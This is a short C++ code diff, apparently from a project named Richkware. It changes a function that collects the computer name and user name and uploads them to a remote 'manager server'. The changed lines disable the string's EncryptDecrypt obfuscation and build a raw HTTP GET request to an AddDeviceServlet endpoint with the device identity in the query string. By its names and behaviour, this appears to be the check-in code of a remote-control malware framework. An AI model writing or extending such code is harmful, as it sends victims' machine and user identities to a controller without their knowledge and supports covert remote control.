@@ -133,13 +133,13 @@ bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, con
 	if (!GetUserName(infoBuf, &bufCharCount))
 		userName = infoBuf;
 
-	Device device = Device(computerName + "/" + userName, "PORTA SU CUI APERTO IL SERVER");
+	Device device = Device(computerName + "/" + userName, "none");
 
-	std::string deviceStr = "{" + device.getName() + "," + device.getServerPort() + "}";
-	deviceStr = EncryptDecrypt(deviceStr,"5");
+	std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
+	//deviceStr = EncryptDecrypt(deviceStr,"5");
 
-	RawRequest(serverAddress, port, deviceStr.c_str());
-    
+	RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/AddDeviceServlet?data=" +deviceStr +" \r\nHost: " + serverAddress + "\r\nConnection: close\r\n\r\n").c_str());
+	
 	return true;
 }
 
